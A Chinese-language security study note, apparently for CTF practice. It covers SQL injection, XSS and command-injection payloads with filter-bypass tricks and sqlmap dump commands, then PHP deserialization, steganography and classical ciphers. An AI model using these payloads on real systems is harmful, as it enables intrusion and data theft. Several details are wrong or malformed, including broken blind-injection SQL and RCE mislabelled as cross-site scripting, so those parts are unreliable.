---
date: 2026-02-12T12:00:00+08:00
title: Security
draft: false
# bookFlatSection: false        # 是否显示扁平章节（默认false）
# bookToc: true                 # 是否显示目录（默认true）
# bookHidden: false             # 是否在侧边栏列表中隐藏（默认false）
# bookCollapseSection: false    # 章节是否默认折叠（默认false）
# bookComments: false           # 是否启用评论（默认false）
# bookSearchExclude: false      # 是否从搜索结果中排除（默认false）
# params:                       # 自定义参数
#   maths: true                 # 数学公式支持
# weight: 1                     # 内容权重（排序用）
---

# 计算机安全 Computer Security

# 注入漏洞

## 概念

安全漏洞（security hole）是在硬件、软件、协议的具体实现或系统安全策略上存在的缺陷，从而可以使攻击者能够在未授权的情况下访问或破坏系统。是受限制的计算机、组件、应用程序或其他联机资源的无意中留下的不受保护的入口点。

注入漏洞主要是是利用应用软件中的安全漏洞，将恶意的输入拼接到原有代码中执行，其类型包括：

1. 服务端注入：
    * 与操作系统交互：命令执行
    * 与编程语言（后端）交互：代码执行
    * 与数据库交互：sql 注入
    * 与模板引擎发生交互：服务端模板注入 flask jinja2 等
    * 与 php/jsp 对象发生交互：反序列化
2. 客户端注入：
    * html 代码注入：xss domxss 等

## 执行

注入漏洞一般的过程分为以下两个步骤：

1. 判断注入点：发现可能执行恶意代码的注入点
2. 判断原有代码：判断原有代码的类型
3. 执行注入：编写并执行注入代码

# sql 注入

## 概念

用户的输入被拼接到 SQL 中执行。

漏洞原因分析：

1. 过滤不严谨
2. 没有预编译，先确定语义，再插入数据

## sql 注入常用语法

### union

```mysql
# union 在联合两条查询语句时，会对结果去重
select column_name1 from table_name2 union select column_name2 from table_name2;
# union all 不去重
select column_name1 from table_name2 union all select column_name2 from table_name2;

# union 在联合两条查询语句时，前后列数必须相同
```

### order by

```mysql
# 使用语法1
order by column_name;
# 使用语法2
order by column_num；
# 例如 order by 1; 根据第一列排序
# 如果 order by 10; 报错 ERROR 1054 (42S22) Unknown column '10' in 'order clause'
# 可以用于推测语句中的列数
```

### group_concat

```mysql
# 将数据聚合到一行显示
group_concat(column_name1, column_name2, ...)
```

### database()

```mysql
# 数据库内置函数，显示当前数据库名
select database();
```

### user()

```mysql
# 数据库内置函数，显示当前用户名
select user();
```

### version()

```mysql
# 数据库内置函数，显示当前数据库版本
select version()
```

### @@datadir

```mysql
# 查询数据库的存储路径
select @@datadir;
```

### #

```mysql
# 注释符，使用注释符来阻止后续语句的执行
url 转义：# --> %23;
# 在 sql 注入过程中，存在闭合符号的情况下，使用 # 来屏蔽后一个闭合符号
select * from user where id = '1' order by 2 #'
```

## sql 注入步骤

### 找到 url 特征

在一个 REST API 里，访问资源 ip:port/resource?para1=value1&para2=value2

可以推测后台使用了 sql 语句：

```mysql
select column_name1, ... from table_name where para1 = value1 and para2 = value2;
```

### 判断注入点类型

判断注入点类型的过程，也是判断是否存在 sql 注入的过程。

```mysql
# sql 常见为如下几种执行方法：
select * from users where id = 1;
select * from users where id = '1';
select * from users where id = "1";
# 变量的类型可以有无闭合符号来判断，闭合符号有两个：' 或 "
# 且闭合符号总是成对出现的
# 在 url 输入的位置，根据是否显示 mysql 报错信息，判断注入点，判断闭合符号
# 如果不显示 mysql 报错信息，则不存在注入点
# mysql 有用的报错信息，是从 near 开始，到 at 结束，实际上就是引号包裹的部分
# 如果输入可以完整显示在 mysql 报错信息中，则判断是字符型；
# 如果输入不能完整显示在 mysql 报错信息中，则判断是数字型。
```

判断注入点类型的同时，也可以判断闭合符号。

字符型中有一类特殊的注入点类型：搜索型

```mysql
select * from users where id like '%1%';
select * from users where id like '%1';
select * from users where id like '1%';
# 变量有通配符 % _ 等
```

### 判断数字型注入点的方法

```mysql
select * from users where id = {};
# 1.
# 输入 1，结果正常
# 2.
# 输入 1' 或 1"，结果异常
# 3.
# 输入 1 and 1 = 1，结果正常
# 4.
# 输入 1 and 1 = 2，结果异常
执行以上四步，如果均按照预期进行输出，则可以判断是数字型的注入点
```

## sql 注入：联合注入 union

### 判断列数

```mysql
order by column_num;
# 可以二分法提高判断列数的效率：3 - 10（error） - 7 - 9（error） - 8
```

### 判断可回显字段

如果将查询语句放在不可回显字段，那么输出的结果我们无法看到；
所以查询一定要放在可回显字段里。

```mysql
# 代码审计
select * from users where id = 'id' limit 0,1;
# 如何绕过？
# 将第一条数据置为空，取一个不存在的值（负数，或无穷大）
select * from users where id = '-1' union select 1,2,...;
```

### 查询数据库名

```mysql
union select group_concat(schema_name) from information_schema.schemata;
```

### 查询表名

```mysql
union select group_concat(table_name) from information_schema.tables;

union select group_concat(table_name) from information_schema.tables where table_schema = '';
union select group_concat(table_name) from information_schema.tables where table_schema = database();
```

### 查询列名

```mysql
union select group_concat(column_name) from information_schema.columns;

union select group_concat(column_name) from information_schema.columns where table_name = '';
union select group_concat(column_name) from information_schema.columns where table_schema = '' and table_name = '';
```

### 查询具体数据

```mysql
union select group_concat(column_name) from database_name.table_name;
```

## sql 注入：布尔盲注

### 找到 url 特征

页面无回显数据，仅显示正确或错误的结果，考虑布尔盲注。一般在找到注入点之后通过代码进行注入。

### 查询数据库名

#### 判断数据库数量

```mysql
and select count(schema_name) from information_schema.schemata > count_num;
# 一般数据库数量在 2-5 个左右
```

#### 判断数据库名的长度

```mysql
and select length(substr(select table_schema from information_schema.schemata limit 0, 1),1) > count_num;
# limit 来取数据库名
# length 来判断数据库名的长度
```

#### 判断数据库名的各个字符

```mysql
# 逐个判断
# 判断第 1 个字符
and select ascii(substr(select table_schema from information_schema.schemata limit 0, 1), 1, 1) = num;
# 数据库命名规则：26个字符 + 0-9 数字 + '_'
# 即 97-122，48-57，95

# 判断第 2 个字符
and select ascii(substr(select table_schema from information_schema.schemata limit 0, 1), 2, 1) = num;

# ...
```

### 查询表名

#### 判断表名的数量

#### 判断表名的长度

#### 判断表的各个字符

### 查询列名

#### 判断字段名的数量

#### 判断字段名的长度

#### 判断字段名的各个字符

### 查询数据项

#### 判断数据项的长度

#### 判断数据项的各个字符

## sql 注入：时间盲注

### 找到 url 特征

页面没有响应，考虑时间盲注：通过判断响应时间的长短判断。一般在找到注入点之后通过代码进行注入。

### 查询数据库名

#### 判断数据库数量

```mysql
and if(select count(schema_name) from information_schema.schemata > count_num, sleep(3), 1);
```

#### 判断数据库名长度

```mysql
and if(select length(substr(select table_schema from information_schema.schemata limit 0, 1),1) > count_num, sleep(3), 1);
```

#### 判断数据库名的各个字符

```mysql
and select ascii(substr(select table_schema from information_schema.schemata limit 0, 1), 1, 1) = num, sleep(3), 1);
```

查询表、字段等操作与布尔盲注类似。

## sql 注入防御绕过

当 sql 语句过滤了一些关键字，则可以通过其他语法来执行注入

### or 过滤防御绕过

```mysql
双写  oorr
大小写  Or oR OR
替代字符  ||  |
```

### limit 过滤防御绕过

```mysql
select * from users limit 0, 1;
替代函数 where rownum = 1;
limit 防御替代逗号 limit 1 offset 0;
```

### 空格过滤防御绕过

```mysql
利用块注释 select/**/id/**/from/**/users;
利用括号 select(id)from(users);
利用反引号 select`id`from`users`;
# 注意，以上符号不能用在关键字上
```

### 引号过滤防御绕过

```mysql
select * from users where id = '1001';
十六进制 select * from users where id = 0x3e9;
```

## sql 注入的自动化工具

### 工具

sqlmap

#### get

```shell
# 判断是否存在 sql 注入
sqlmap -u "url" --batch
# 查询数据库
sqlmap -u "url" --batch -dbs
# 查询表
sqlmap -u "url" --batch -D database_name --tables
# 查询数据
sqlmap -u "url" --batch -D database_name -T table_name --dump
```

#### post

```shell
sqlmap -r ....txt --batch 
```

# 跨站脚本攻击（Cross Site Scripting）

## 概念

跨站脚本攻击，简称：XSS。以下为几个基本概念：

* 同站/跨站

    同站的判断标准 有效顶级域名 + 二级域名

* 同源/跨域

    同源策略，浏览器安全策略，判断标准：协议、主机名、端口

* 跨域传输 CORS

* 脚本

    一般是 javascript，攻击者在存在漏洞的页面嵌入恶意攻击代码，当正常用户访问该页面时，会触发攻击代码。

* 内容安全策略 CSP

    只能加载某些资源

## 攻击分类

1. 反射型 xss

    有后端交互。如果要攻击，要找到反射型 xss。

2. 存储型 xss

    有后端交互

3. DOM 型 xss

    无后端交互

## 如何挖掘漏洞

### 找交互点

### 测试代码

一般执行以下测试代码，可以判断交互点是否存在 xss 漏洞

```html
<!-- 标签触发 js -->
<script>alert(1)</script>
<!-- 属性直接触发 js -->
<img src=1 onerror=alert(1)>
<!-- 属性直接触发 js -->
<a href=javascript:alert(1)>测试代码</a>
```

### 过滤

html 实体（针对符号，使用 html 属性、事件）

php、java 内置方法、内置函数

自己编写的过滤代码

str_replace

preg_replace

preg_match

## 常见危害

盗取 cookie

主机扫描

可以通过 xss 平台模块下载详细代码

# 远程命令/代码执行（Remote Command/Code Execute）

## 概念

跨站脚本攻击，简称：RCE。以下为基本概念：

* 命令执行：通过代码注入直接执行操作系统的命令 linux windows
* 代码执行：通过代码注入执行后端变成语言 java php

RCE 的危害要比 XSS 要大。

## 远程命令执行

### linux 常用命令

1. pwd
2. ls
3. id
4. find
5. grep
6. cat
7. head
8. tail
9. more

### linux 闭合符号

1. ;

    分号，前后的命令都执行，且都回显执行结果

2. |

    管道符，前面命令的输出作为后面命令的输入，只会回显最后一条命令的执行结果

3. ||

    逻辑或（短路或），如果前一条语句为真，则后一条语句不会执行；如果前一条语句为假，则会执行后一条语句

4. &

    后台运算符，把一条命令放在后台执行，而不占用前端操作。所有命令都会执行，且会分配一个进程号

5. &&

    逻辑与（短路与），前面一条语句为真，则会执行后一条语句；如果前一条语句为假，则不会执行后一条语句

6. %0a

    url 编码的换行符，是执行防御绕过的一种策略

### linux 命令执行的防御绕过

#### 过滤 cat

```shell
# 1.使用通配符
# whereis cat
# /bin/cat /usr/share/man/man1/cat.1.gz
/bin/ca? filename
/bin/ca* filename
# 2.使用变量拼接
a=ca;b=t;$a$b filename 
# 3.使用环境变量
${SHELLOPTS:3:1}${SHELLOPTS:2:1}${SHELLOPTS:29:1} filename
# 4.使用命令转义符号，可以用来拼接通配符
ca\t filename
ca\
t\
filename
# 5.编码
# echo cat | base64
# Y2F0Cg==
`echo 'Y2F0Cg==' | base64 -d` filename
# cat 十六进制 0x636174
`echo 0x636174 | xxd -r` filename
# 6.使用替代命令
head
tail
tac
```

#### 过滤空格

```shell
# 1.使用环境变量 $IFS，包含空字符，包括空格、tab、换行等
cat$IFS$1filename
cat$IFS$9filename
cat$IFS${10}filename
cat${IFS:1:1}filename
# 2.重定向
cat<filename
cat<>filename
# 3.逗号
{cat,filename}
{ls,-l,filename}
```

#### 过滤分隔符

```bash
# 过滤 | & ; / \ 等分隔符，使用 url 编码绕过
# 1.%0a 代替换行
# 2.%09 代替 Tab
# 3.%3b 代替 ;
# 4.%5c 代替 \
# 5.%24 代替 $
```



## 远程代码执行

### 可以触发命令执行的函数

在 php 语言中，包括：

1. system
2. passthru
3. shell_exec
4. exec
5. eval 语言构造
6. assert

### 常用函数

在 php 语言中，包括：

1. scan_dir
2. hightlight_file
3. show_source
4. flag

# 注入练习靶场

* 综合靶场：
    * dvwa
    * pikachu
* sql 注入靶场：
    * sqli
* 网络练习平台：
    * ctfhub
    * buuctf

xss-game-master

antsword

burp suite

# 反序列化（Unserialize）

## 概念

serialize 序列化：将对象转换为字节流，为传输对象提供一种简单的方法

unserialize 反序列化：将字节流还原为对象

## 序列化

在 php 语言中，不同的变量序列化之后的内容如下：

### 字符串

```php
serialize("aaa");
# s:3:"aaa";
serialize("");
# s:0:"";
serialize("aa a");
# s:4:"aa a";
```

### 整形

```php
serialize(111);
# i;111;
```

### 浮点型

```php
serialize(111.11);
# i;111.11000000001
```

### 对象

```php
class people{
    public String name;
    public int age;
    // setter and getter
    // override toString
}
# bob is 18 years old
O:6:"People":2:{s:4:"name";s:3:"bob";s:3:"age";i:18;};
# O -> 对象
# 6 -> 类名的长度
# "People" -> 类名
# 2 -> 属性的数量
```

### 空

```php
serialize(null);
# N
```

## php 魔术方法

以双下划线（__）开头的方法叫做魔术方法。php 中常用 5 个魔术方法：

1. __construct：构造方法，在创建对象时先调用此方法
2. __destruct：析构方法，在销毁对象时（对象的引用被删除时）先调用此方法
3. __sleep：序列化时触发
4. __wakeup：反序列化时触发
5. __toString：打印对象时触发

普通方法需要显示调用，而魔术方法在满足一定条件后会自动调用

## 反序列化漏洞

反序列化漏洞，即通过拼接序列化参数，使程序执行危险代码

当反序列化的参数可控，类的方法（魔术方法）中存在危险函数，且危险函数的参数是变量。危险函数包括各种漏洞的关键函数

常见的危险函数：

1. 命令执行/代码执行

    eval assert system

2. 文件操作

    文件读取 file_get_contents show_source、文件写入、文件删除

# 文件隐写

## 文件结构

1. 文件头

    文件头可以用来判断文件的类型
    文件头包含文件的基本信息，例如：文件声明、文件类型、文件日期等
    操作系统在读取文件的时候，是从文件名开始的，到文件尾结束

2. 文件体

    文件体记录文件的主要内容
    文件体之中可以追加内容，但要注意对文件本身的影响

3. 文件尾

    文件尾可以用来判断文件的结束
    文件尾之后追加内容对文件本身不产生影响

判断文件是根据文件头进行判断的，修改文件扩展名不影响文件类型，但文件头被破环后无法进行判断。

常见的文件头，可以在搜索引擎搜索：misc 文件头。以下简单举例：

* JPEG (jpg)，文件头：FF D8 FF E0 文件尾：FF D9
* PNG (png)，文件头：89 50 4E 47 文件尾：AE 42 60 82
* ZIP Archive (zip)，文件头：50 4B 03 04 文件尾：50 4B 05 06

当文件头被破坏时，可以通过文件尾来推测文件类型，修复文件头

## 判断文件类型的方式

1. linux file 命令

    文件头可能被破坏，不一定准确

2. linux strings 命令

3. 010edit、winhex 等十六进制编辑器

## 文件尾追加

在文件尾可以直接追加隐藏信息

通过 linux strings 命令可以简单查阅

# 图片隐写

## 概念

图片压缩方式包括两种：

1. 无损压缩：PNG GIF BMP
2. 有损压缩：JPEG

可以在图片中隐藏某些信息，方法如下：

1. 直接写在属性中
2. 修改图层
3. IHDR 隐写（修改宽高）
4. LSB 隐写（修改 RGB 最低有效位）
5. 盲水印

图片隐写解密流程：

1. 查看图片属性
2. 尝试打开图片，判断是否存在 IHDR 隐写
3. 查看图层，判断是否存在图层隐写和 LSB 隐写
4. 判断是否存在其他的隐写
5. 考虑是否存在其他文件，binwalk 分析文件、foremost 分离文件
6. github 搜索关键词，查看是否存在可能的解决方式

## 图层隐写

图层隐写的条件为无损压缩图片。

在图层中隐藏信息，这是最简单的隐写。

## IHDR 隐写（图片高宽隐写）

IHDR 隐写的条件为无损压缩图片。

将图片以十六进制打开，找到 IHDR 关键字，在其后 8 byte 是对图片宽度（4 byte）和高度（4 byte）的描述。修改宽高数据后，图片损坏无法打开或显示不完整，可以用来隐藏信息。

可以通过 PNG 图片的循环校验位 CRC 判断是否存在 IHDR 隐写，并可以通过暴力破解的方式进行恢复

如果循环校验位同时被修改，则无法进行恢复

## LSB 隐写（Least Significant Bit，最低有效位隐写）

LSB 隐写的条件为无损压缩图片。

对于 RGB 色彩模式，每一个颜色可以有 256 种颜色，RGB 三种色彩组合后可以有 16777216 种颜色。RGB 每个颜色占 8 位，一般会修改最低位，从颜色不会有较大改变。可以用来隐藏信息。

一般使用工具来解密，例如 windows stegsolve.jar

判断是否存在 LSB，一般通过与图片对比，判断各通道位是否存在反直觉的不规则色块来确定

注意色彩排序，一般是 RGB，但也有概率是 GBR、BGR 等

## 盲水印隐写

多张图片，看起来一摸一样，对比图片，可以寻找到其中的不一致，即隐藏的信息。

## F5 算法隐写

一般以 jpg 图片为，隐晦的提示刷新过的图片。

一般使用工具来解密，例如 F5-steganography

# 文档隐写

## word 隐写

### 隐藏文字

通过 word 编辑器查看隐藏文字

### xml dom 隐写

word 的本质是一个压缩文件，将 word 转换为 zip，可以查看隐藏的内容

## pdf 隐写

一般使用工具来解密，例如 wbStego4open

# 音频隐写

## mp3steg

mp3 格式 + 密码

## 频谱图

听声音，有杂音，一般和摩斯电码一起

一般使用工具来解密，例如 audacity

## 波形图

一般使用工具来解密，例如 audacity

# 压缩文件隐写

## 伪加密

通常为 zip 文件。如果数据区的全局方位标记未加密，但目录区的全局方位标记加密，则代表压缩文件是伪加密。

zip 文件的结构：

```
文件头开始（数据区）
50 4b 03 04
在文件头区，存在全局方位标记（文件头开始后第 3-4 byte），用来标识是否加密
全局方位标记在未加密时，默认为 00 00
加密时，为 09 00

目录区开始
50 4b 01 02
在文件目录区，存在全局方位标记（目录区开始后第 5-6 byte），用来标识是否加密
全局方位标记在未加密时，默认为 00 00
加密时，为 09 00

文件尾开始
50 4b 05 06
```

## 暴力破解

对压缩文件的密码进行暴力破解。一般在找到密码的规律后进行，例如：密码位银行卡密码（6 位数字）、或在密码在固定范围/字典中、或已知密码的一部分等，否则暴力破解的耗时过久

一般使用工具来解密，例如 archive

## 明文攻击

压缩包中的某个文件与另一个明文文件的 CRC32 值相同

一般使用工具来解密，例如 archive

## CRC 爆破

zip 文件是基于 Deflate 算法（美国人 Phil Katz 发明，文件头 50 4b 03 04 翻译即为 PK，其一生具有悲剧色彩），CRC 摘要根据文件内容计算

对于长度非常小的文件（<= 6）时，可以直接根据 CRC 摘要进行源文件内容爆破

# 其他隐写

## snow 隐写（HTML 隐写）

## base64 隐写

改写 base64 串，在其中隐藏信息

## 逆向排序隐写

将文件逆向排序，文件损坏无法打开，隐藏信息

# 流量分析

## 网络流量

一般使用工具，例如 windows wireshark，linux tcpdump

通过解析 http、ftp 等网络通讯内容，通过内容过滤的方式，找到某些网络通讯中隐藏的内容

如果隐藏的时图片，可以添加文件头："data:image/png;base64,"，直接在浏览器打开，即可显示图像

## USB 流量

通过监听 USB 接口流量，可以获取鼠标、键盘、可移动存储设备的明文传输信息。包括 USB 无线网卡传输的内容等。

根据截取到的数据文件，再通过对应的算法还原即可得到隐藏的信息。

# 密码学

## 换位密码

### 栅栏密码（Rail-fence Cipher）

### 列移位密码（Columnar Transposition Clipher）

明文，根据密钥进行加密。举例如下：

```
明文：the quick brown for jumps over the lazy dog
将明文填充到事先约定的行列中，例如：5 行 7 列
t h e q u i c
k b r o w n f
o r j u m p s
o v e r t h e
l a z y d o g 

密钥：howareu
密钥的列数需要与明文的列数相同或成倍数。根据密钥再字母表中出现的顺序进行排序
h->3, o->4, w->7, a->1, r->5, e->2, u->6

将密钥放在明文填充的阵列上，根据密钥顺序，得到加密内容
3 4 7 1 5 2 6
t h e q u i c
k b r o w n f
o r j u m p s
o v e r t h e
l a z y d o g
密文：qoury inpho tkool hbrva uwmtd cfseg erjez
```

### 曲路密码（Curve Cipher）

明文，约定曲路路径。举例如下：

```
明文：the quick brown for jumps over the lazy dog
将明文填充到事先约定的行列中，例如：5 行 7 列
t h e q u i c
k b r o w n f
o r j u m p s
o v e r t h e
l a z y d o g 

密钥是行列的读取顺序，例如：按列读取，顺序为 7654321

按照曲路顺序读取
1       2   3      4   5      6   7
t ↑   ↓ h ← e ↑  ↓ q ← u ↑  ↓ i ← c ↑
k ↑   ↓ b   r ↑  ↓ o   w ↑  ↓ n   f ↑
o ↑   ↓ r   j ↑  ↓ u   m ↑  ↓ p   s ↑
o ↑   ↓ v   e ↑  ↓ r   t ↑  ↓ h   e ↑
l ↑ ← ↓ a   z ↑←-↓ y   d ↑←-↓ o   g ↑
密文：gesfc inpho dtmwu qoury zejre hbrva lookt
```

## 单表替换密码

明文和密文一一对应，较容易破解。

### 凯撒密码（Caesar Cipher）

将字母偏移进行映射。举例如下：

```
明文：abcdefghijklmnopqrstuvwxyz
密文（偏移量为3）：defghijklmnopqrstuvwxyzabc

算法表示如下：
明文（Plain text, message）：p 或 m
密文（Cipher text）：c
密钥（Key）：k
加密函数：ek()
解密函数：dk()
c = ek(m) = (m + k) mod 26
m = dk(c) = (c - k) mod 26
```

### rot 13

属于凯撒密码的特例，偏移量为 13，向前或向后移位完全相同，导致加密和解密方法完全相同

### rot 5

将数字偏移进行映射。举例如下：

```
明文：0123456789
密文（偏移量为5）：5678901234
```

### rot 18

rot 18 不是一个加密算法，是将 rot 5 和 rot 13 合并起来称为 rot 18

### rot 47

按照 ASCII 码表移位，将 ASCII 码表中的十进制表示 - 47，举例如下：

```
明文：A（97）
密文（偏移量为47）：2（50）
```

### 乘法密码

将每个字母的值使用一个简单的函数映射到另一个字母

```
乘法密码：k
c = ek(m) = (m * k) mod n
m = dk(c) = c * (k^-1 mod n)
需要满足：
（1）0 < k < n
（2）k 和 n 互为素数，否则不存在逆模元，不能正确解密
n 一般取 26

逆模运算：
满足 (k * k^-1) ≡ 1(mod 26)，则称 k^-1 为 k 的逆模，或称 k 模 26 的逆为 k^-1

明文：abc (0,1,2)
密钥：5
密文：afk (0,5,10)
```

### 仿射密码（Affine Cipher）

将每个字母的值使用一个简单的数学函数映射到对应的数值，再把对应数值转换为字母。

仿射密码同时结合了密码偏移量和乘法密码。

```
乘法密码：a
偏移量：b
需要满足：
c = ek(m) = (a * m + b) mod 26
m = dk(c) = a^-1 * (c - b) mod 26
```

### 埃特巴什码（Atbash Cipher）

密文表是明文表的逆序，举例如下：

```
明文表：abcdefghijklmnopqrstuvwxyz
密文表：zyxwvutsrqponmlkjihgfedcba

明文：the quick brown for jumps over the lazy dog
密文：gsv jfrxp yilim ulc qfnkh levi gsv ozab wlt
```

### 简单替换密码（Simple Substitution Cipher）

明文字母替换为随机另一个字母（保持关系唯一）。

由于没有明确的逻辑，所以几乎不能使用暴力破解的方式，需要使用词频分析尝试破解，尝试逐一将密文破解为单词，再进行破解。

举例如下：

```
明文表：abcdefghijklmnopqrstuvwxyz
密文表：phqgiumeaylnofdxjkrcvstzwb

明文：hello my name is john
密文：einnd ow fpoi ar ydef
```

### 波利比奥斯方阵密码（Polybius Square Cipher）

是棋盘密码的一种，通过点阵的方式加密。举例如下：

```
将 26 个字母排布为 5*5 的密码表
   1  2  3  4  5 
1  a  b  c  d  e
2  f  g  h  ij k
3  l  m  n  o  p
4  q  r  s  t  u
5  v  w  x  y  z

明文：this is fun
密文：44232443 2443 214533
```

### 敲击码（Tap Code）

基于波利比奥斯方阵实现，，不同的是 K 字母被整合到 C 中多表替换密码

```
将 26 个字母排布为 5*5 的密码表
   1  2  3  4  5 
1  a  b  ck d  e
2  f  g  h  i  j
3  l  m  n  o  p
4  q  r  s  t  u
5  v  w  x  y  z
```

### 普莱菲尔密码（Playfair Cipher）

普莱菲尔密码（Playfair Cipher）又称单方密码（Single-square Cipher），使用双字替换密码，双字加密替换单字加密。

再其后还出现了二方密码（Two-square Cipher）、四方密码（Four-square Cipher）等

```
明文：my name is air

密钥；airrudder
将密钥，剔除相同的字母后，排列在 5*5 矩阵中，并将其他字母按顺序排列，形成密码表（i 和 j 排在一起）：
airrudder -> airude
a  ij r  u  d
e  b  c  f  g
h  k  l  m  n
o  p  q  s  t
v  w  x  y  z

将明文两两排开，末尾单个字母加上 X 使之成对
得：my na me is ai rx

加密规则，找到字母在矩阵中的地方：
（1）如果两个字母在同一横行，则取这两个字母右方的字母
（2）如果两个字母在同一纵列，则取这两个字母下方的字母
（2）如果两个字母不在同一横行，也不在同一纵列，则取两个字母使其成为矩阵，先取横行，再取纵列
根据以上规则
密文：su hd hf up ir cr
```

### 四方密码（Four-Square Cipher）

四方密码使用四个 5 * 5 的矩阵组成密码，通常左上和右下是明文，右上和左下是密文。举例如下：

```
明文：my name is air

密钥；airrudder, bkkchysr
将密钥，剔除相同的字母后，排列在 5*5 矩阵中，并将其他字母按顺序排列，形成密码表（i 和 j 排在一起）：
airrudder -> airude, bkkchysr -> bkchysr
a  b  c  d  e        a  ij r  u  d
f  g  h  ij k        e  b  c  f  g
l  m  n  o  p        h  k  l  m  n
q  r  s  t  u        o  p  q  s  t
v  w  x  y  z        v  w  x  y  z

b  k  c  h  y        a  b  c  d  e
s  r  a  d  e        f  g  h  ij k
f  g  ij l  m        l  m  n  o  p
n  o  p  q  t        q  r  s  t  u
u  v  w  x  z        v  w  x  y  z

将明文两两排开，末尾单个字母加上 X 使之成对
得：my na me is ai rx

加密规则，找到字母在矩阵中的地方：
先在明文矩阵中找到按左上、右下的顺序找到字母，再在右上、左下两个矩阵中取两个字母使其成为矩阵，先取横行，再取纵列

根据以上规则
密文：vm ch kn qc su vq
```

### 维吉尼亚密码（Vigenère Cipher）

单一凯撒密码的基础上扩展出来的多表替换密码，根据密钥（当密钥长度小于明文长度时可以循环使用）来决定用哪一行的密表来替换，以此来对抗词频分析

```
密码表（26 * 26 的方阵）：
   a b c d e f g h i j k l m n o p q r s t u v w x y z
   ---------------------------------------------------
a |a b c d e f g h i j k l m n o p q r s t u v w x y z
b |b c d e f g h i j k l m n o p q r s t u v w x y z a
c |c d e f g h i j k l m n o p q r s t u v w x y z a b
  |...
y |y z a b c d e f g h i j k l m n o p q r s t u v w x
z |z a b c d e f g h i j k l m n o p q r s t u v w x y

明文：public key distribution
密钥：encrypt

由于密钥短于明文，将密钥循环，达到明文长度，然后根据密码方阵，先横后纵或先纵后横，找到密码表中映射的字母，进行映射
明文：public key distribution
密钥：encrpy ten crpytencrpyt
密文：thdcgr dil fzqikmowkgdg
```

### 自动密钥密码（Autokey Cipher）

与维吉尼亚密码类似，区别在于密钥不同。自动密钥密码的开头时一个关键词，之后则是明文的重复

```
明文：my name is air
关键词；airrudder
密钥：ai rrud de rmy

根据 26 * 26 的密码表，得出：
密文：mg ergh lw rup
```

## 替换密码

### 培根密码（Baconian Cipher）

每一个明文字母被一个五个字符的序列替换

```
密码表：
a -> aaaaa
b -> aaaab
c -> aaaba
...
z -> bbaab

明文：dog
密文：aaabb abbba aabba
```

### 莫斯密码（Morse Code）

由点 (.)、划 (-)、空格 (/) 组成

```
a -> .-
b -> -...
c -> -.-.
...
```

### 云影密码（01248密码）

使用 0 1 2 4 8 这五个数字，其中 0 代表见个，其他数字相加，代表不同的数字

```
1 -> a(1)
2421 -> i(9)
...
```

### 键盘密码

手机键盘中的数字代表的密码

```
21 -> a
22 -> b
...
```

### 猪圈密码（Pigpen Cipher）

以格子为基础的一种替换密码，以图形代表

```
a | b | c
——————————
d | e | f
——————————
g | h | i

j* | k* | l*
———————————
m* | n* | o*
———————————
p* | q* | r*

\ s /
t × u
/ v \

 \ w* /
x* ×  y*
 / z* \

密码：
a -> _|
b -> |_|
...
j -> _*|
```

### 海伦盲文

盲文密码

### 跳舞的小人

福尔摩斯探案集中的密码

### JSFuck

JSFuck 使用 6 个字符 [ ] { } + ! 来编写 JS 程序,k

```
false -> ![]
true -> !![]
0 -> +[]
...
```

### BrainFuck

使用 < > + - . , [ ] 的组合，来做一种编程语言

### Ook

使用 Ook. Ook! Ook? 三种组成（也可以简写为 . ! ?）一种编程语言，和 BrainFuck 存在映射关系

### 社会主义核心价值观密码

使用社会主义核心价值观（富强、民主、文明、和谐,自由、平等、公正、法治,爱国、敬业、诚信、友善）作为密码表进行加密

## 特殊编码

### base64 编码

base64 将原字节流按照 6 bit 进行拆分

```
加密规则：
（1）将原文按照字符集转换为字节流
（2）按 6 bit 截取字节流，使用 ASCII 码解码，
（3）参照 base64 编码表，重新进行编码
（4）在原字节流的数据长度无法满足 3 的倍数的情况下，新字节流的数据需要进行填充操作，每有一个余数需补一个 “=”，即最多补 2 个 “=”，最少一个也没有

base64 编码表：
0 -> A  10-> K  20 -> U  30 -> e  40 -> o  50 -> y  60 -> 8
1 -> B  11-> L  21 -> V  31 -> f  41 -> p  51 -> z  61 -> 9
2 -> C  12-> M  22 -> W  32 -> g  42 -> q  52 -> 0  62 -> +
3 -> D  13-> N  23 -> X  33 -> h  43 -> r  53 -> 1  63 -> /
4 -> E  14-> O  24 -> Y  34 -> i  44 -> s  54 -> 2  
5 -> F  15-> P  25 -> Z  35 -> j  45 -> t  55 -> 3  
6 -> G  16-> Q  26 -> a  36 -> k  46 -> u  56 -> 4  
7 -> H  17-> R  27 -> b  37 -> l  47 -> v  57 -> 5  
8 -> I  18-> S  28 -> c  38 -> m  48 -> w  58 -> 6  
9 -> J  19-> T  29 -> d  39 -> n  49 -> x  59 -> 7  

举例如下：
明文：FF
原字节流：0100 0110 0100 0110
新字节流：(00)010001 (00)100100 (00)011000 -> (17)R (36)k (24)Y
密文：RkY=
```

### base32 编码

和 base64 同理

```
将原字节流按照 5 bit 进行拆分

base32 编码表：
0 -> A  10-> K  20 -> U  30 -> 6
1 -> B  11-> L  21 -> V  31 -> 7
2 -> C  12-> M  22 -> W
3 -> D  13-> N  23 -> X
4 -> E  14-> O  24 -> Y
5 -> F  15-> P  25 -> Z
6 -> G  16-> Q  26 -> 2
7 -> H  17-> R  27 -> 3
8 -> I  18-> S  28 -> 4
9 -> J  19-> T  29 -> 5
```

### base16 编码

和 base64 同理

```
将原字节流按照 4 bit 进行拆分

base16 编码表：
0 -> 0  10-> A
1 -> 1  11-> B
2 -> 2  12-> C
3 -> 3  13-> D
4 -> 4  14-> E
5 -> 5  15-> F
6 -> 6
7 -> 7
8 -> 8
9 -> 9
```

### XXencode 编码

和 base64 类似，逐渐被 base64 替代。XXencode 将 “-” 替换了 “/”，且字母的编码顺序和 base64 不同

### UUencode 编码

和 base64 类似，逐渐被 base64 替代。字母的选取和字母的编码顺序和 base64 不同

### shellcode 编码

将每个字符的十六进制 ASCII 码，并将每个十六进制码改写为 “\x” 形式

```
明文：I love you Jack
Hex ASCII 码：0x49 0x20 0x6c0x6f0x760x65 0x20 0x790x6f0x75 0x20 0x4a0x610x630x6b
密文：\x49\x20\x6c\x6f\x76\x65\x20\x79\x6f\x75\x20\x4a\x61\x63\x6b
```

### Quoted-printable 编码

互联网邮件扩展（MIME）的一种实现方式

将每个字符的十六进制 ASCII 码，并将每个十六进制码改写为 “=” 形式

```
明文：I love you Jack
Hex ASCII 码：0x49 0x20 0x6c0x6f0x760x65 0x20 0x790x6f0x75 0x20 0x4a0x610x630x6b
密文：=49=20=6c=6f=76=65=20=79=6f=75=20=4a=61=63=6b
```

### URL 编码

